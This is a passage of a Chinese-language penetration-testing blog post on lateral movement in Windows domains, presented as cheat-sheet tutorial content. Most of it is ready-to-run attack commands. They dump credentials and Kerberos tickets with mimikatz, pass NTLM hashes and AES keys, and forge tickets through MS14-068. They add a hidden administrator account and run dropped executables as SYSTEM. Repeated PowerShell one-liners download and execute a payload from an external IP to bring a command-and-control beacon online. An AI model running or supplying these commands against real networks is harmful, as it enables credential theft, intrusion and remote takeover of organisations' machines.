class=\"line\">OutFile：输出的文件名</span><br><span class=\"line\">Domain：要爆破的域</span><br><span class=\"line\">Force：强制喷洒继续，而不提示确认</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import-Module DomainPasswordSpray.ps1 导入</span><br><span class=\"line\">Invoke-DomainPasswordSpray -UserList 1.txt -Domain hack.com -Password Admin@123 -Force -OutFile res.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"pth哈希传递横向移动\"><a class=\"markdownIt-Anchor\" href=\"#pth哈希传递横向移动\">#</a> PTH 哈希传递横向移动</h3>\n<p>大多数渗透测试人员都听说过哈希传递 (Pass The Hash) 攻击。该方法通过找到与账户相关 的密码散列值 (通常是 NTLM Hash) 来进行攻击。在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本 地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登 录内网中的其他计算机。同时，通过哈希传递攻击，攻击者不需要花时间破解密码散列值 (进而获得密码明文)。 在 Windows 网络中，散列值就是用来证明身份的 (有正确的用户名和密码散列值，就能通过验证), 而微软自己的产品和 工具显然不会支持这种攻击，于是，攻击者往往会使用第三方工具来 完成任务。在 WindowsServer2012R2 及之后版 本的操作系统中，默认在内存中不会记录明文密码，因此，攻击者往往会使用工具将散列值传递到其他计算机中，进行权 限验证，实现对远程计 算机的控制。</p>\n<p><strong>希传递攻击原理</strong></p>\n<p>当用户需要登录某网站时，如果该网站使用明文的方式保存用户的密码，那么，一旦该网站出现安全漏洞，所有用户的明 文密码均会被泄露。由此，产生了散列值的概念。当用户设置密码时，网站服务器会对用户输入的密码进行散列加密 处理 (通常使用 MD5 算法) 散列加密算法般为单向不可逆算法。当用户登录网站时，会先对用户输入的密码进行散列加 密处理，再与数据 库中存储的散列值进行对比，如果完全相同则表示验证成功。 主流的 Windows 操作系统，通常会使用 NTLM Hash 对访问资源的用户进行身份验证。早期 版本的 Windows 操作系 统，则使用 LMHash 对用户密码进行验证。但是，当密码大于等于 14 位 时，就无法使用 LM Hash 了。从 Windows vista 和 Windowsserver2008 版本开始，Windows 操作 系统默认禁用 LMHash, 因为在使用 NTLM Hash 进行身份认 证时，不会使用明文口令，而是将明文口令通过系统 API (例如 Lsalogon User) 转换成散列值。不过，攻击者在获得密 码散列值之 后，依旧可以使用哈希传递攻击来模拟用户进行认证。</p>\n<p><strong>哈希传递条件</strong></p>\n<p>哈希传递攻击的前提：有管理员的 NTLM Hash ，并且目标机器开放 445 端口。</p>\n<p>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。</p>\n<p><strong>Windows Vista 之后的机器，只能是 administrator (SID 为 500) 用户的哈希值才能进行哈希传递攻击</strong>，其他用户 (包括管理员用户但是非 administrator) 也不能使用哈希传递攻击，会提示拒绝访问</p>\n<p>在工作组环境中：</p>\n<p>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。</p>\n<p>WindowsVista 之后的机器，只能是 administrator 用户的哈希值才能进行哈希传递攻击，其他用户 (包括管理员用户但是非 administrator) 也不能使用哈希传递攻击，会提示拒绝访问。</p>\n<p>在域环境中：</p>\n<p>只能是域管理员组内用户 (可以是域管理员组内非 administrator 用户) 的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器</p>\n<p>使用 mimikatz 进行 hash 传递，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:hack.com /ntlm:570a9a65db8fba761c1008a51d4c95ab</span><br></pre></td></tr></table></figure>\n<p>传递完成后会弹出一个框可以进行链接了</p>\n<p>使用 cs</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210175949983.png\" alt=\"image-20221210175949983\"></p>\n<h3 id=\"pass-the-key密钥传递攻击ptk横向攻击\"><a class=\"markdownIt-Anchor\" href=\"#pass-the-key密钥传递攻击ptk横向攻击\">#</a> <strong>pass the key 密钥传递攻击 (PTK) 横向攻击</strong></h3>\n<p>WinXP/2003/Vista/2008 ，以及未打 KB2871997 补丁之前的 Win7/2008r2/8/2012，这些环境我们都可以使用 NTLM 哈希传递</p>\n<p>对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012，可以<strong>使用 AES keys 代替 NTLM 来进行验证</strong></p>\n<p><strong>KB2871997</strong>：禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行 wmi、psexec、schtasks、at 和访问文件共享。</p>\n<p>这个补丁发布后常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator (SID 500) 账号例外，利用这个账号仍可以进行 Pass The Hash 远程连接，即使 administrator 修改了名字但是还可以<strong>通过 AES 密钥来替代 NTLM 验证进行横向的操作</strong>，其实这个补丁挺鸡肋的，不用 AES 密钥照样也可以用 NTLM，只是需要 Administrator（SID 500），都拿到机器了，Administrator 还不容易吗？这个补丁唯一的好处就是减少存储在内存中的凭据数据，也就是让 wdigest 协议认证的凭据不会存储在 lsass.exe，这样子当你 dump lsass.exe 的时候你就会发现，wdigest 协议中的凭据你就看不到了！</p>\n<p><strong>抓取密码</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa:ekeys</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210182917579.png\" alt=\"image-20221210182917579\"></p>\n<p>传递域中 administrator 的 aes256key</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::pth /user:administrator /domain:hack.com /aes256:b03fcae60f0b32a105a8082e89a09cd88a5a6c54b0a209caaa9664c6bc223232</span><br></pre></td></tr></table></figure>\n<p>传递后在被控机器上弹出一个 system 权限的 cmd</p>\n<p>但是横向时需要使用主机名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\2012-1.hack.com</span><br><span class=\"line\">copy C:\\Users\\admin\\Desktop\\wanli.exe \\\\2012-1.hack.com\\C$</span><br><span class=\"line\">schtasks /create /s 2012-1.hack.com /tn test /sc onstart /tr c:\\wanli.exe /ru system /f</span><br><span class=\"line\">schtasks /run /s 2012-1.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"pass-the-ticket-票据传递攻击ptt横向攻击\"><a class=\"markdownIt-Anchor\" href=\"#pass-the-ticket-票据传递攻击ptt横向攻击\">#</a> <strong>pass the ticket</strong> 票据传递攻击 (PTT) 横向攻击</h3>\n<p>要想使用 mimikatz 的哈希传递功能，必须具有本地管理员权限。 mimikatz 同样提供了不需要本地管理员权限进行 横向渗透测试的方法，</p>\n<p>例如票据传递 (PassThe Ticket,PTT)</p>\n<p>票据传递是基于 kerberos 认证的一种攻击方式，常用来做后渗透权限维持。</p>\n<p>黄金票据攻击利用的前提是得到了域内 krbtgt 用户的 NTLM 哈希或 AES-256 的值。</p>\n<p>白银票据攻击利用的前提是得到了域内服务账号的 HTML 哈希或 AES-256 的值。</p>\n<p>票据传递攻击一般分为两种</p>\n<p>1、自己制作票据</p>\n<p>2、传递内存中的票据</p>\n<p>导出内存的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure>\n<p>执行以上命令后，会在当前目录下出现多个服务的票据文件，例如 krbtgt、cifs、ldap 等。</p>\n<p>清除内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell klist purge</span><br><span class=\"line\">mimikatz kerberos::purge</span><br><span class=\"line\">两个都是清除票据</span><br></pre></td></tr></table></figure>\n<p>将高权限的票据文件注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt [0;998d7]-2-0-40e10000-Administrator@krbtgt-HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n<p>查看票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell klist</span><br><span class=\"line\">mimikatz kerberos::tgt</span><br></pre></td></tr></table></figure>\n<p>访问机器 (admin 用户没有过 uac)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\2012-1.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p><strong>横向后都是 system 权限</strong></p>\n<h3 id=\"ptt攻击之ms14-068传递获取域管横向\"><a class=\"markdownIt-Anchor\" href=\"#ptt攻击之ms14-068传递获取域管横向\">#</a> <strong>PTT 攻击之 ms14-068 传递获取域管横向</strong></h3>\n<p>ms14-068 漏洞主要通过伪造域管的 TGT，<strong>将普通用户权限提权为域管权限</strong>，以此来控制域控。只要服务器未打 ms14-068 补丁（KB3011780），在 server 2000 以上的域控服务器中，都可进行利用</p>\n<p><strong>MS14-068 的利用条件</strong></p>\n<p>1、获取域普通用户的账号密码</p>\n<p>2、获取域普通用户的 sid</p>\n<p>3、服务器未打 KB3011780 补丁</p>\n<p>查看域用户的 SID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whoami /all</span><br></pre></td></tr></table></figure>\n<p>清除内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">klist purge</span><br></pre></td></tr></table></figure>\n<p>生成票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ms14-068.exe -u 域用户@域名 -p 域用户密码 -s 域用户SID -d 域控</span><br></pre></td></tr></table></figure>\n<p>执行后会生成一张伪造的 tgt</p>\n<p>导入票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerberos::ptc 票据名字</span><br></pre></td></tr></table></figure>\n<p>执行命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\dc2.test.com\\c$ 注意是机器名不是IP</span><br></pre></td></tr></table></figure>\n<p><strong>goldenPac.exe</strong></p>\n<p>此工具是 impacket 工具包里的，它是 MS14-068+psexec 的组合，因此使用起来非常放方便快捷</p>\n<p>用法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">goldenPac.exe 域名/域用户名:域用户明文密码@域控完整域名</span><br></pre></td></tr></table></figure>\n<h3 id=\"psexec工具远程命令执行横向移动\"><a class=\"markdownIt-Anchor\" href=\"#psexec工具远程命令执行横向移动\">#</a> <strong>PsExec 工具远程命令执行横向移动</strong></h3>\n<p>psexec 是 windows 下非常好的一款远程命令行工具。psexec 的使用不需要对方主机开方 3389 端口，只需要对方开启 admin<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>共享和</mtext><mi>i</mi><mi>p</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">共享和ipc</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord cjk_fallback\">共</span><span class=\"mord cjk_fallback\">享</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">c</span></span></span></span> (该共享默认开启，依赖于 445 端口)。但是，假如目标主机开启了防火墙（防火墙禁止 445 端口连接），psexec 也是不能使用的，会提示找不到网络路径。由于 psexec 是 Windows 提供的工具，所以杀毒软件将其列在白名单中</p>\n<p><strong>PsExec 使用条件</strong></p>\n<p>1、具有正确的凭证（内存凭证、账号密码、账号 NTLM Hash）</p>\n<p>2、能建立 IPC 链接（也就是需要通过 smb 认证的），且目标机器开启了共享（默认开启的），并且目标共享中必须有 admin$ 共享</p>\n<p><strong>PsExec 常用参数</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psexec \\\\ip -u administrator -p admin cmd 进⼊半交互式shell</span><br><span class=\"line\">PsExec -accepteula \\\\192.168.108.101 -s cmd.exe 建立交互的shell</span><br><span class=\"line\">psexec \\\\ip - uadministrator -p admin -w c:\\cmd 进⼊交互式shell，且c:\\是⽬标机器的⼯作⽬录</span><br><span class=\"line\">psexec \\\\ip -u administrator -p admin whoami all 执行命令</span><br><span class=\"line\">psexec \\\\ip -u administrator -p admin -d c:\\beacon.exe 执行文件</span><br><span class=\"line\">psexec \\\\ip -u administrator -p admin -h -d c:\\beacon.exe UAC的⽤⼾权限执行文件</span><br></pre></td></tr></table></figure>\n<p>第一次使用时会弹窗，加上 accepteula 取消弹窗</p>\n<p><strong>IPC$ 下的 psexec</strong></p>\n<p>建立 IPC$ 连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.41.150\\ipc$ &quot;Admin@123&quot; /user:administrator</span><br></pre></td></tr></table></figure>\n<p>直接执行命令，建立 ipc 后无需输入密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psexec.exe -accepteula \\\\192.168.41.150 -s cmd.exe 返回交互shell（必须是msf或者远程到桌面CS不行）</span><br><span class=\"line\">psexec.exe -accepteula \\\\192.168.41.150 -s ipconfig 远程执行命令</span><br></pre></td></tr></table></figure>\n<p><strong>PTH 下的 psexec</strong></p>\n<p>进行 psexec 攻击上线</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211180427093.png\" alt=\"image-20221211180427093\"></p>\n<p><strong>PTT 下的 psexec</strong></p>\n<p>导出内存的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure>\n<p>清除内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell klist purge</span><br><span class=\"line\">mimikatz kerberos::purge</span><br></pre></td></tr></table></figure>\n<p>将高权限的票据文件注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt [0;998d7]-2-0-40e10000-Administrator@krbtgt-HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psexec.exe \\\\dc.hack.com -h -d c:\\wanli.exe</span><br></pre></td></tr></table></figure>\n<h3 id=\"wmic远程执行命令横向移动\"><a class=\"markdownIt-Anchor\" href=\"#wmic远程执行命令横向移动\">#</a> <strong>WMIC 远程执行命令横向移动</strong></h3>\n<p>WMIC 扩展 WMI（Windows Management Instrumentation，Windows 管理工具） ，提供了从命令行接口和批处理脚本执行系统管理的支持。</p>\n<p>简单来说：wmic 就是 wmic.exe，位于 windows 目录底下，是一个命令行程序。WMIC 可以以两种模式执行：交互模式 (Interactive mode) 和非交互模式 (Non-Interactive mode)，WMI 就是 WindowsManagement Instrumentation（Windows 管理规范）。它是 Windows 中的一个核心管理技术。</p>\n<p><strong>wmic 命令需要本地管理员或域管理员才可以进行正常使用</strong>，普通权限用户若想要使用 wmi，可以修改普通用户的 ACL，不过修改用户的 ACL 也需要管理员权限，普通用户使用 wmic。以下命令均在 2008R2、2012R2、2016 上进行测试，部分命令在虚拟机中测试不行。</p>\n<p><strong>wmic 调用 cmd</strong></p>\n<p>以下命令需要管理员权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">执行命令并且输出</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create &quot;cmd.exe /c ipconfig &gt;c:\\ip.txt&quot;</span><br><span class=\"line\">列出远程主机进程</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process list brief</span><br><span class=\"line\">在远程系统上执行bat脚本</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create c:\\programdata\\test.bat</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</span><br><span class=\"line\">执行powershell上线</span><br><span class=\"line\">wmic /NODE:IP /user:本地用户管理员/域管理员 /password:密码 PROCESS call create &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;ps脚本地址&#x27;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>利用 powershell 上线</strong></p>\n<p>1、使用 cs 生成 powershell 脚本</p>\n<p>2、wmic 进行上线，把 ps1 放大公网，可以使用 python 开启 http 服务提供下载 python-m http.server 9988</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic /NODE:192.168.41.148 /user:administrator /password:Admin@123 PROCESS call</span><br><span class=\"line\">create &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>Wmiexec 工具</strong></p>\n<p>wmiexec 是一个即有全交互也有半交互的远程命令执行工具，有 python 版本的 pe 版本可运用于多种环境，包括 webshell 环境、rdp 环境、socks 环境等</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmiexec.exe 域名/用户名:密码@目标IP #哈希传递获得shell</span><br><span class=\"line\">wmiexec.exe 域名/用户名:密码@目标IP &quot;ipconfig&quot; #执行命令</span><br><span class=\"line\">wmiexec.exe -hashes LM Hash:NT Hash 域名/用户名@目标IP #哈希传递获得shell</span><br><span class=\"line\">wmiexec.exe -hashes LM Hash:NT Hash 域名/用户名@目标IP &quot;ipconfig&quot; #执行命令</span><br></pre></td></tr></table></figure>\n<p><strong>利用 powershell 上线</strong></p>\n<p>1、使用账号密码登录进行 powershell 上线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmiexec.exe administrator:Admin@123@192.168.41.40 &quot;powershell.exe -nop -w hidden</span><br><span class=\"line\">-c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>\n<p>2、使用 hash 上线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmiexec.exe -hashes</span><br><span class=\"line\">aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab</span><br><span class=\"line\">administrator@192.168.41.40 &quot;powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>wmiexec.vbs</strong></p>\n<p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能。其可以在远程系统中执行命令并进行回显，获取远程主机的半交互式 Shell。wmiexec.vbs 支持两种模式，一种是半交互式 shell 模式，另一种是执行单条命令模式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript.exe //nologo wmiexec.vbs /cmd IP 用户 密码 &quot;命令&quot;</span><br></pre></td></tr></table></figure>\n<p>使用 powershell 上线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript.exe //nologo wmiexec.vbs /cmd 192.168.41.148 administrator Admin@123</span><br><span class=\"line\">&quot;powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>Invoke-WMIExec</strong></p>\n<p>Invoke-WMIExec 是一个 powershell 脚本在 Invoke-TheHash 的文件中用法如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Invoke-WMIExec -Target IP -Domain 域 -Username 用户 -Hash hash-Command &quot;calc.exe&quot;</span><br><span class=\"line\">-verbose</span><br></pre></td></tr></table></figure>\n<p>采用无文件落地的方式进行横向</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell powershell -exec bypass -c IEX (New-Object</span><br><span class=\"line\">System.Net.Webclient).DownloadString(&#x27;http://118.178.134.226:9988/Invoke\u0002WMIExec.ps1&#x27;);import-module .\\Invoke-WMIExec.ps1;Invoke-WMIExec -Target</span><br><span class=\"line\">192.168.41.148 -Username administrator -Hash 570a9a65db8fba761c1008a51d4c95ab -</span><br><span class=\"line\">Command &quot;whoami&quot; -verbose</span><br></pre></td></tr></table></figure>\n<p>本地执行</p>\n<p>1、导入脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell-import powershell/Invoke-WMIExec.ps1</span><br></pre></td></tr></table></figure>\n<p>2、运行上线命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell Invoke-WMIExec -Target 192.168.41.20 -Username administrator -Hash</span><br><span class=\"line\">570a9a65db8fba761c1008a51d4c95ab -Command &quot;powershell.exe -nop -w hidden -c IEX</span><br><span class=\"line\">((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot; -</span><br><span class=\"line\">verbose</span><br></pre></td></tr></table></figure>\n<p><strong>Invoke-WMIMethod.ps1</strong></p>\n<p>该模块为 Powershell 内置模块，以下为示例，可以自由组合命令进行测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$User #目标系统用户名</span><br><span class=\"line\">$Password #目标系统密码</span><br><span class=\"line\">$Cred #账号密码整合，导入Credential</span><br><span class=\"line\">Invoke-WMIMethod #远程运行指定程序</span><br><span class=\"line\">#####---------------------------#####</span><br><span class=\"line\">$User = &quot;administrator&quot;</span><br><span class=\"line\">$Password= ConvertTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class=\"line\">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -</span><br><span class=\"line\">ArgumentList $User , $Password</span><br><span class=\"line\">Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe</span><br><span class=\"line\">-nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot; -</span><br><span class=\"line\">ComputerName &quot;192.168.41.20&quot; -Credential $Cred</span><br></pre></td></tr></table></figure>\n<h3 id=\"smb远程执行命令横向移动\"><a class=\"markdownIt-Anchor\" href=\"#smb远程执行命令横向移动\">#</a> <strong>SMB 远程执行命令横向移动</strong></h3>\n<p>SMB 全称是 Server Message Block 翻译过来是服务器信息块，它也是一种客户端到服务器的通信协议。除此之外，SMB 协议也被称为请求 - 回复协议。 客户端与服务器建立连接后，客户端可以向服务器发送 SMB 命令允许用户访问共享、打开、读取或者是写入文件。</p>\n<p>利用条件：开启了 445 端口</p>\n<p><strong>smbexec 使用</strong></p>\n<p>smbexec 为 impacket 工具中的工具，操作简单，容易被杀，使用时无需先进行 IPC 连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文传递命令：</span><br><span class=\"line\">smbexec hsyy.com/administrator:123.com@192.168.213.163</span><br><span class=\"line\">hash传递：</span><br><span class=\"line\">smbexec -hashes :$HASH$ ./admin@192.168.213.163</span><br><span class=\"line\">smbbexec -hashes :$HASH$ domain/admin@192.168.213.163</span><br></pre></td></tr></table></figure>\n<p><strong>使用明文</strong></p>\n<p>1、输入命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbexec administrator:Admin@123@192.168.41.148</span><br></pre></td></tr></table></figure>\n<p><strong>使用 hash</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbexec -hashes aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab administrator@192.168.41.148</span><br></pre></td></tr></table></figure>\n<h3 id=\"dcom远程执行命令横向移动\"><a class=\"markdownIt-Anchor\" href=\"#dcom远程执行命令横向移动\">#</a> <strong>DCOM 远程执行命令横向移动</strong></h3>\n<p>DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求，使用 DCOM 进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管 COM 服务器端的软件</p>\n<p><strong>获取 DCOM 列表</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Get-CimInstance Win32_DCOMApplication</span><br><span class=\"line\">Get-CimInstance -classWin32_DCOMApplication | select appid,name</span><br><span 